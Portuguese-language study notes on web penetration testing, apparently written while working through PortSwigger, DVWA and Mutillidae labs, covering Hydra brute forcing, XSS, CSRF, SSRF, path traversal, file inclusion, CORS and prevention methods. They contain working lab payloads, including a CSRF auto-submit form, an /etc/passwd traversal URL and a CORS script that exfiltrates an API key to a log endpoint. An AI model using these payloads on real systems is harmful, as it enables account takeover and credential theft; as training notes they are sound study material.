		  5) Além disso, é necessário indicar o parâmetro a ser testado, na própria URL. Primeiramente, o Hydra testará o username, inserindo o USER, conforme a lista de usuários (username=^USER^). Depois, será testada a password (password=^PASS^). 
		  6) Por fim, para sabermos se o usuário existe ou não, vamos verificar se a mensagem "Senha incorreta" foi acionada. Colocaremos o S= para indicar o caso afirmativo, seguido da mensagem que aparece na tela do site quando digitamos um usuário existente e uma senha incorreta.
		  7) Para visualizar o processo mais detalhadamente, podemos usar o modo verbose, incluindo o -V no início do comando
$ hydra -l bruno -P passwords.txt "localhost" http-form-post "/bruteforce1/index.php:username=^USER^&password=^PASS^:Senha incorreta"  => Note que em "...password=^PASS^:Senha incorreta" retiramos o "S=" isso significa que agora iremos pegar apenas o caso negativo, ou seja, caso a senha não esteja incorreta. 
```

#Cross_Site_Scripting (XSS):
     * De acordo com a OWASP, os ataques XSS Persistent são aqueles onde os scripts são armazenados permanentemente no back-end. A vítima então recebe esse script ao realizar o acesso a página.
       ! XSS reflected => Caso for feito um XSS refletido, o script inserido é executado apenas na página do atacante. Devido a isso, caso ele queira que outro usuário acesse a página, deverá enviar sua url para que o outro acesse e veja seu script. Isso é um ataque de engenharia social conhecido como phishing.
         XSS Persist => Caso for feito um XSS armazenado ou persistente, o script inserido pelo atacante ficará armazenado no servidor da aplicação, sendo assim, qualquer outro usuário que acessar a página verá o script injetado.
         XSS baseada em DOM => XSS baseada em DOM, ela se diferencia dos outros tipos de XSS porque o ataque, nesse caso, acontece apenas no navegador do cliente sem que nenhum parâmetro seja enviado ao servidor.
```
   $ nc -lvp 80   =>  Net catch, responsável por abrir portas, ele ficará escutando as informações que trafegam nessa porta. Utilizando o Kali Linux, abrimos o terminal e nele vamos usar o net catch (nc). O nc deve escutar (-l) e mostrar (v) a porta (p) de número 80.
       $ No lab 1 de XSS da PortSwigger colocamos na barra de busca '<script>alert(1)</script>', essa informação alterou nossa url, assim, quando alguem acessar esse link novamente, a url virá com esse script que será interpretado pelo navegador.
       $ No lab 3 analisando o html vimos que a cada busca na barra de pesquisa o texto é adicionado me uma tag img ' <img src="/resources/images/tracker.gif?searchTerms=busca feita na barra de pesquisa ">'. Dessa forma, podemos colocar um código nessa tag para executarmos um ataque XSS, ' <img src="/resources/images/tracker.gif?searchTerms="><svg onload=alert(1)> //
"> '
       ==== Como evitar XSS =========    
       ! De acordo com a OWASP, uma das formas de prevenir o ataque de Cross Site Scripting (XSS) seria de realizar o escaping de elementos HTML prevenindo assim que seja interpretado como um contexto de execução. Por exemplo em Java, a OWASP possui uma biblioteca (ESAPI) que auxilia nessas questões.
         Poderíamos colocar em nossa programação no back-end: String encoding=ESAPI.encoder().encodeForJavaScript(); Dessa forma, se colocarmos: <script>, através do escaping teremos a conversão desses elementos html para seus respectivos códigos: &ltscript&gt
         Podemos também, evitar esse ataque em Java fazendo o seguinte => Vamos implementar a interface Validator do Spring para realizarmos a validação do que o usuário está passando no campo título e mensagem do depoimento. Ao fazermos isso, somos obrigado a implementar dois métodos supports e validate, o método supports recebe a classe do objeto que está querendo ser validado e retorna se o validador consegue lidar com ele. Na sequência, no método validate, iremos realizar a configuração da validação do que queremos fazer. A nossa estratégia para evitar esse ataque vai ser verificar se esses campos possuem abertura ou fechamento de tag (< ou >), pois com isso, o usuário não conseguirá inserir a tag <script> para colocar o código Javascript do ataque que ele realizou anteriormente, caso os campos contenham essas tags, iremos mostrar uma mensagem de erro.
       ! Encoding e Validation => A função do encoding filtra os dados que o usuário inserir, assim o navegador o interpreta como dado e não como código. Porém, apenas o encoding não é suficiente para proteção de ataques de XSS, pois ele não irá prevenir que o usuário insira um script entre caracteres em HTML e continue executando códigos da mesma forma. Por exemplo: ` &lt; script &gt;` Onde, &lt; equivale a menor que < e &gt; a maior que >. Para isso, se utiliza também a função validation para filtrar todas as entradas do usuário.
         Content Security Policy (CSP) => O CSP é um cabeçalho HTTP que fornece uma lista de recursos confiáveis para o navegador, podendo ser um script, CSS, imagem ou outro tipo de arquivo. Com isso, mesmo se um usuário conseguir injetar um código no seu site, o CSP poderá impedir a sua execução. https://developer.mozilla.org/pt-BR/docs/Web/HTTP/CSP
         X-XSS-Protection  => O X-XSS-Protection é um cabeçalho fornecido pela Internet Explorer, Chrome e Safari. Ele é capaz de configurar uma proteção contra ataques XSS Refletidos. 
         Bibliotecas => Para .NET, você pode utilizar a Microsoft AntiXSS Library; Para o PHP, tem o HTML Purifier; E para o Java, você pode utilizar o Java Encoder ou o AntiSamy.
        https://www.youtube.com/watch?v=lntsVxPZibw
```
#Mass_Assignment:
       * A atribuição em massa é uma vulnerabilidade do computador em que um padrão de registro ativo em um aplicativo Web é abusado para modificar itens de dados que o usuário normalmente não deve ter permissão para acessar, como senha, permissões concedidas ou status de administrador. (O ataque de Mass Assignment explora a questão dos frameworks MVC permitirem que associemos valores dos formulários diretamente com nossas classes de modelo. Com isso, o usuário pode vir através da manipulação do formulário HTML alterar os atributos presentes nessa classe modelo.)
 	  ! Github já sofreu com esse ataque, ver: https://gist.github.com/peternixey/1978249    e   https://www.alura.com.br/artigos/seguranca-de-sua-aplicacao-e-os-frameworks-ataque-ao-github
       ! Para proteger contra o ataque de Mass assignment nós criamos uma classe chamada UsuarioDTO que poderia ser utilizada em qualquer framework. Uma alternativa ao DTO é o método setAllowedFields, em que somente os atributos listados é que poderão ser manipulados pelo usuário. Com isso, mesmo que o usuário tente manipular o atributo roles pelo formulário HTML, isso não será refletido para o atributo da nossa classe e um usuário só será cadastrado com o perfil ROLE_USER. (O método setAllowedFields permite que nós especifiquemos quais são os atributos da classe que o usuário terá permissão de manipular. No caso da Alura Shows, temos a classe modelo Usuario com o atributo roles que não deve ser manipulado e com isso não o especificamos dentro desse método.)
#Backdoor:
     * Um backdoor seria um arquivo no qual é usado para conexão, permitindo assim quando usado de forma correta, que um administrador possa entrar no sistema para realizar reparos de problemas. Quando usado de forma incorreta, o backdoor torna-se uma forma que hackers utilizam para ganhar acesso de forma ilícita.
       !Uploads de arquivos podem se tornar um problema, vimos em nossa aplicação pelo fato do sistema não verificar o tipo de arquivo, fomos capazes de inserir um backdoor e ganhamos assim acesso ao sistema. Ao filtrar o tipo de arquivo, temos uma segurança maior que o que será passado é apenas o necessário para nossa aplicação, por exemplo, poderíamos colocar em Java:  
```
$ FileFilter filtro = new FileNameExtensionFilter("jpg", "jpeg");
```
#Credential_Spoofing:
      Credential stuffing is a type of cyberattack in which the attacker collects stolen account credentials, typically consisting of lists of usernames and/or email addresses and the corresponding passwords (often from a data breach), and then uses the credentials to gain unauthorized access to user accounts through large-scale automated login requests directed against a web application.
#Path_Traversal:
      * Um ataque de passagem de diretório explora validação de segurança insuficiente ou sanitização de nomes de arquivos fornecidos pelo usuário, de forma que os caracteres que representam "passagem para o diretório pai" são passados ​​para a API do sistema de arquivos do sistema operacional.
      ! https://192.168.189.128/mutillidae/index.php?page=../etc/passwd
#Remote_File_Inclusion (RFI):
      * Remote file inclusion (RFI) is an attack targeting vulnerabilities in web applications that dynamically reference external scripts. The perpetrator’s goal is to exploit the referencing function in an application to upload malware (e.g., backdoor shells) from a remote URL located within a different domain.
      * Remote File Inclusion (RFI), que geralmente ocorre quando a aplicação, por meio de algum parâmetro, incorpora em algum arquivo um código que está presente dentro de outro servidor.
      ! https://192.168.189.128/mutillidae/index.php?page=https://www.google.com 
#Local_File_Inclusion (LFI):
      * Local File Inclusion is an attack technique in which attackers trick a web application into either running or exposing files on a web server. LFI attacks can expose sensitive information, and in severe cases, they can lead to cross-site scripting (XSS) and remote code execution.
#Cross-Site_Request_Forgery:
      * Resumidamente, nesse cenário, assumimos o papel de usuário 1, quem faz a manipulação do site e envia a URL suspeita por e-mail ao usuário 2. O usuário 2 acessa o endereço e sua senha é alterada sem que ele saiba, caracterizando um cross-site request forgery (CSRF).  
      ! https://192.168.100.167/dvwa/vulnerabilities/csrf/?password_current=123456&password_new=123&password_conf=123&Change=Change# => Essa URL pode ser enviada para um encurtador de URL 
      * Ele consiste em uma série de caracteres aleatórios, gerados a cada formulário a ser preenchido pelo usuário que é enviado pelo servidor. Após o recebimento pelo usuário, o token é checado novamente. O servidor só aceita o POST caso o CSRF Token se provar igual ao enviado inicialmente. Diferentemente do session token e dos cookies, o CSRF Token não pode ser utilizado por um hacker mal intencionado.
#Cross-site_request_forgery:  
      * O cross-site request forgery, em português falsificação de solicitação entre sites, também conhecido como ataque de um clique ou montagem de sessão, é um tipo de exploit malicioso de um website, no qual comandos não autorizados são transmitidos a partir de um usuário em quem a aplicação web confia.
      * Cross-Site Request Forgery (CSRF) is an attack that forces an end user to execute unwanted actions on a web application in which they’re currently authenticated. With a little help of social engineering (such as sending a link via email or chat), an attacker may trick the users of a web application into executing actions of the attacker’s choosing. If the victim is a normal user, a successful CSRF attack can force the user to perform state changing requests like transferring funds, changing their email address, and so forth. If the victim is an administrative account, CSRF can compromise the entire web application.
      https://security.love/CSRF-PoC-Genorator/ => colete essas informações no proxy do Burp Suite, você irá criar um arquivo eu deverá cadastrar um usuário de sua escolha (por exemplo) usando o header http
      ! No lab 1 de CSRF usamos o script: <html> <body> <form enctype="application/x-www-form-urlencoded" action="https://0a0600c3030c116bc0fe0af000d800af.web-security-academy.net/my-account" method="POST"> <input type="hidden" name="email" value="pwned@evil-user.net" /> </form> <script> document.forms[0].submit();</script></body> </html>

#Server-side_request_forgery:
      * In computer security, server-side request forgery (SSRF) is a type of exploit where an attacker abuses the functionality of a server causing it to access or manipulate information in the realm of that server that would otherwise not be directly accessible to the attacker.
      ! https://192.168.100.167/mutillidae/index.php?page=https://localhost/ => aqui pela URL conseguimos retornar o localhost do servidor a partir da minha máquina, confirando assim um SSRF
      ! http://localhost/admin/delete?username=carlos
      ! Tendo como exemplo o provedor de nuvem AWS, é bastante comum de se ver aplicações hospedadas em um Amazon Elastic Compute Cloud (Amazon EC2) e, com isso, atacantes acabam obtendo um meio de acessar credenciais de metadados de máquinas EC2 por meio do SSRF.
        No exemplo descrito na página Hacking The Cloud, é possível ver que a maioria das instâncias do EC2 possuem acesso ao serviço de metadados que contém informações, como endereço IP da instância, credenciais das IAM roles e o nome do security group e, esse acesso é feito por meio do endereço de IP 169.254.169.254.
        https://hackingthe.cloud/aws/exploitation/ec2-metadata-ssrf/
#CORS (Cross-origin resource sharing):
      * O CORS é uma política do HTTP de controle de compartilhamento de recursos entre sites, decidindo que origens serão aceitas ou rejeitadas. Resumidamente, temos o lado do cliente (por exemplo, o domínio do Github) que fará uma requisição para uma API (por exemplo, uma API do GitHub). Quando o compartilhamento de recursos é autorizado, costumamos ver no header "Access-Control-Allow-Origin:" seguido do domínio autorizado. Assim, a API determina que a origem é segura e a resposta é enviada com os recursos compartilhados. 
      ! Podemos executar um ataque do tipo CORS criando um exploit, ou script, que use CORS para obter algum dado do usuário que acessá-lo. Sendo tudo isso por meio de uma Engenharia Social, onde o(a) atacante pode elaborar um email ou outra artimanha que induzirá algum alvo acessar o exploit.

Lab 1 de CORS da PortSwigger:

Com isso, simulamos a construção de um script, ou exploit, que assim que o usuário acessar, por meio dos logs conseguimos ver sua API key por estar aberta a compartilhamento entre sites pela configuração falha do CORS.

```
<html>
<body>
<script>
   var xhrequest = new XMLHttpRequest();
   // Preencha com a URL do seu laboratorio aqui:
   var url = "https://0abe00ef04a17ad3c0102ceb00270080.web-security-academy.net"

   xhrequest.open('GET', url + "/accountDetails", true);
   xhrequest.withCredentials = true;
   xhrequest.send(null)

   xhrequest.onreadystatechange = function() {
       if (xhrequest.readyState == XMLHttpRequest.DONE){
           fetch("/log?key=" + xhrequest.responseText)
       }
   }
</script>
</body>
</html>
```
<html>
<body>
<script>
   var xhrequest = new XMLHttpRequest();
   // Preencha com a URL do seu laboratorio aqui:
   var url = "https://0abe00ef04a17ad3c0102ceb00270080.web-security-academy.net"

   xhrequest.open('GET', url + "/accountDetails", true);
   xhrequest.withCredentials = true;
   xhrequest.send(null)

   xhrequest.onreadystatechange = function() {
       if (xhrequest.readyState == XMLHttpRequest.DONE){
           fetch("/log?key=" + xhrequest.responseText)
       }
   }
</script>
</body>
</html>

## Kali-Linux 
https://github.com/wwong99/pentest-notes/blob/master/oscp_resources/OSCP-Survival-Guide.md#kali-linux
```
$ macof -i eth0     => O comando macof, se refere a overflow de endereços mac. É preciso informar em que interface ( -i) esse ataque será realizado. No nosso caso, temos a eth0, a placa de rede que está conectada ao switch no programa de emulação. Ao dar enter, ele começará a mandar uma infinidade de endereços para o switch, a fim de lotar a memória e fazer com que ele trabalhe como um switch, podendo assim pegarmos informações de pacotes com o wireshark
$ arp -a            => Ver quais endereços MAC estão salvos para serem usados pelo ARP
$ `netstat -lntp`       => Show active internet connections
$ netstat -antp |grep apache                    => Verify a service is running and listening
$ md5sum <file>     => Verifica a integridade um arquivo transferido pela rede (ex: via Netcat TCP/UDP), gera um códido hash, se esse código hash no remetente e no destinatário forem iguais, então a transferência deu certo
$ netdiscover -i eth0
```

[[Anonimato na rede]]
## Certificações

https://www.comptia.org/pt/certificacoes/security => Certificado introdutório, antes de fazer o CEH ou OSCP
https://www.offensive-security.com/pwk-oscp/
https://www.eccouncil.org/programs/certified-ethical-hacker-ceh/
https://www.eccouncil.org/programs/licensed-penetration-tester-lpt-master/
https://alpinesecurity.com/training/catalog/  ==> Para se preparar para o LPT
https://www.cisco.com/c/en/us/training-events/training-certifications/certifications/associate/ccna.html
https://www.offensive-security.com/web200-oswa/
https://solyd.com.br/treinamentos/pentest-profissional-v2022/